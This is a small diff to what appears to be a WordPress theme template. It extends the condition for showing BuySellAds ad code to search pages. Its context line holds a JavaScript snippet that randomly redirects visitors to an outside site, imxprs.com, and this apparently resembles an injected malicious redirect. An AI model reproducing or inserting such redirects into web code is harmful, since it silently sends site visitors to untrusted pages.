@@ -288,7 +288,7 @@ if (random < 5){window.location.href='https://www.imxprs.com/?is=5r3w'}
 		$cat = wp_get_post_categories(get_the_id(), array('fields' => 'all'));
 		$qo = $cat[count($cat)-1];
 	}
-	if(isChildren(19, $qo->term_id) OR $qo->term_id == 19 OR isChildren(19, $qo->parent))
+	if(isChildren(19, $qo->term_id) OR $qo->term_id == 19 OR isChildren(19, $qo->parent) OR is_search())
 	{
         ?>
         <!-- BuySellAds Ad Code -->
